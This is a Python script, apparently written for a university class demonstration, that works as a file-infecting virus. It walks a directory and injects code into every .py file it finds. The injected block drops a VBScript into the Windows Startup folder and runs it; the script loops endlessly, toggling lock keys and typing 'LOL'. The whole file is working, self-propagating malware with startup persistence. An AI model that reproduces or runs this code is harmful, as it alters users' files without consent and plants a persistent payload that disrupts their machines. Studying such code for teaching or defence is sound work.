import getpass
import os

# gets the username of the current logged in user to go to the filepath with files to infect
username = getpass.getuser()
# MAKE SURE TO CHANGE THIS FILEPATH TO THE REPOSITORY ON YOUR MACHINE IF THIS IS NOT THE FILEPATH
infectiondir = f"C:/Users/{username}/Documents/GitHub/UIdahoCS336VirusPresentation/ExampleScripts"

# gets a list of every file and folder in this directory
subdirs = os.walk(infectiondir, topdown=True, followlinks=False)
# look through every subdirectory
for d in subdirs:
	# look through every file in each directory
	for file in d[2]:
		# if that file is a python file, infect it
		if (file.endswith(".py")):
			infpath = f"{d[0]}/{file}"
			flines = []
			inflines = []
			# get a string list of every line in the file
			with open(infpath, "r") as inf:
				flines = inf.readlines()

			# copy over all the import lines
			while (flines[0].startswith("import ") or (flines[0].startswith ("from ") and "import " in flines[0]) or flines[0].startswith("#") or flines[0].startswith("\n") or flines[0].startswith("\t")):
				inflines.append(flines[0])
				flines.pop(0)

			# put the virus code at the start of the file (right after all the import lines)
			inflines.append("# ------------------------ VIRUS STARTS HERE ------------------------\n")
			inflines.append("import getpass\n")
			inflines.append("import os\n")
			inflines.append("\n")
			inflines.append("username = getpass.getuser()\n")
			inflines.append("startupdir = f\"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\"\n")
			inflines.append("filename = \"StartupController.vbs\"\n")
			inflines.append("with open(f\"{startupdir}/{filename}\", \"w\") as file:\n")
			inflines.append("\tfile.write(\"set output=wscript.createobject (\\\"wscript.shell\\\")\\n\")\n")
			inflines.append("\tfile.write(\"do\\n\")\n")
			inflines.append("\tfile.write(\"wscript.sleep 100\\n\")\n")
			inflines.append("\tfile.write(\"output.sendkeys \\\"{CAPSLOCK}\\\"\\n\")\n")
			inflines.append("\tfile.write(\"output.sendkeys \\\"{NUMLOCK}\\\"\\n\")\n")
			inflines.append("\tfile.write(\"output.sendkeys \\\"{SCROLLLOCK}\\\"\\n\")\n")
			inflines.append("\tfile.write(\"output.sendkeys \\\"LOL \\\"\\n\")\n")
			inflines.append("\tfile.write(\"loop\")\n")
			inflines.append("\n")
			inflines.append("cwd = os.getcwd()\n")
			inflines.append("os.chdir(startupdir)\n")
			inflines.append("os.system(filename)\n")
			inflines.append("os.chdir(cwd)\n")
			inflines.append("# ------------------------ VIRUS ENDS HERE ------------------------\n")

			# copy over the rest of the file
			inflines.extend(flines)

			# write the lines from the file back into itself with the virus code injected
			with open(infpath, "w") as inf:
				for s in inflines:
					inf.write(s)